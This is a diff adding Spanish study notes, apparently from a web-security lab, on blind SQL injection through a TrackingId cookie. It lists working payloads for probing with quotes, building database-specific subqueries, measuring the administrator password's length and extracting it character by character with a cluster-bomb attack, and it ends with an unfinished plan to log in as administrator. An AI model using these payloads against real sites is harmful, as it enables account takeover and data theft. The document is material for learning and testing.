@@ -150,12 +150,78 @@ Ejemplo:
 | Netezza             | `SELECT columnname, datatype FROM _v_relation_column WHERE tablename = 'TABLE';`                    |
 | Clustrix            | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
 
-**Blind SQL**
+**Blind SQL Guia**
+1. Identifica el parametro inyectable `TrackingId`
+2. Genera un error de sintaxis básico  y ve su coportamiento, ejemplo una comilla simple `TrackingId=xyz'` esto debería generar un error
+3. Ahora dos comillas `TrackingId=xyz''` con esto verificamos que el error anterior se elimina
+4. Se crea un comando de subconsulta `TrackingId=xyz'||(SELECT '')||'` para SQL y para Oracle `TrackingId=xyz'||(SELECT '' FROM dual)||'` 
 - Verificar inyeción en las cookies y verificar su comportamiento con una sentencia Falsa o Verdadero (1=1, 1=0)
 - Identificar posibles tablas y columnas a traves de fuerza bruta
 - Conocer el tamaño del objetivo a enumerar > `' AND (SELECT len(password) from users where username = 'administrator')='§1§'--`
 - Ejecución de un cluster bomb para enumerar datos sensibles > `' AND (SELECT substring(password,§1§,1) from users where username = 'administrator')='§x§'--`
 
+## Identificación SQL Blind
+### Encontrar donde es inyectable 
+Usualmente puede ser una cookie, por lo que las inyecciones serán a través de la modificación de la cookie y actualizando la página
+
+### Encontrar la cantidad de campos
+- A diferencia de una inyección NO BLIND, no es tan relevante ya que aquí no existe información visible, la intención de blind es identificar datos a través del comportamiento de la aplicación, generando errores intencionados para identificar si un dato es verdadero o falso
+- En este tipo de inyección no es tan impportante identificar el tipo de datos ya que solo nos guiaremos a partir del comportamiento, aunque el tipo de dato si debe ser considerado en las consultas que se vayan a realizar
+
+### Base SQL Blind
+La base de SQL blind es la generación de errores intencionados,  es decir se inyectan consultas verdaders y falsas para poder conocer el comportamiento de la aplicación y aprtir de esto generar subconsultas
+- Existen  los errores de logica 1=2
+- Existen errores de aritmeticos 1/0
+- Errores de sintaxis Selet * from dual;
+
+Los pasos son los siguientes:
+**1** Generación de error de sintaxis
+```
+Suponiendo la siguiente consulta: SELECT ID FROM TRACKING WHERE ID = 'xyz'
+El valor del ID es xyz
+
+Error básico 1: Añadir una comilla simple ' => xyz' => Esto es un error de sintaxis porque el caracter indica un inicio o cierre de un dato por que estaría incompleto
+  SELECT ID FROM TRACKING WHERE ID = 'xyz''
+Error básico 2: Añadir dos comillas simples ' => xyz' => Esto es como una cadena vacia o un NULL ya que esta indicando el inicio y termino de una cadena vacia
+  SELECT ID FROM TRACKING WHERE ID = 'xyz'''
+
+Lo anterior confirmará que el error de sintaxis tiene efecto en la aplciación
+```
+**2**Confirmar que la inyección se interpreta como una consulta, es decir que llega al backend
+```
+Suponiendo la siguiente consulta: SELECT ID FROM TRACKING WHERE ID = 'xyz'
+El valor del ID es xyz
+
+*Imporante se debe considerar que tipo de base de datos se esta utilizando ya que podria existir para que esto sea efectivo, si la sintaxis es correcta y no genera resultados se debe considerar elegir otra sintaxis de otra base de datos o considerar que esta siendo filtrada la salida
+PARA PostgreSQL
+TrackingId=xyz'||(SELECT '')||' => Esto genera una subconsulta vacia
+PARA MS SQL
+TrackingId=xyz'+(SELECT '')+' => Esto genera una subconsulta vacia
+PARA MYSQL
+TrackingId=xyz' (SELECT '') ' => Esto genera una subconsulta vacia
+PARA ORACLE
+TrackingId=xyz'||(SELECT '' FROM dual)||'
+
+Una vez confirmada la consulta, genera una consulta invalida, esto confirmara que el back-end esta procesando la inyeccion como una consulta SQL
+PARA PostgreSQL
+TrackingId=xyz'||(SELECT '' FROM tabla-imaginaria )||' => Esto genera una subconsulta vacia
+```
+**3**Consultas clave
+```
+Intenta siempre generar consulta SQL sintacticamente validas, para obtener información clave utilizando errores para inferir la información clave
+
+TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||' => Si la consulta no devuelve un error se puede inferir que existe, es imporatnte delimitar el numero de columnas de lo contrario romperan la concatenación
+```
+
+**4**Consultas clave a través de condiciones
+
+
+### Identificar el tipo de base de datos
+Identificar base de datos
+Identificar tablas - si pero sus comandos no funcionaron
+Identificar columnas - si pero sus comandos no funcionaron
+Realizar la consulta de los usuarios -
+Loguearse xomo administrador
 
 
 
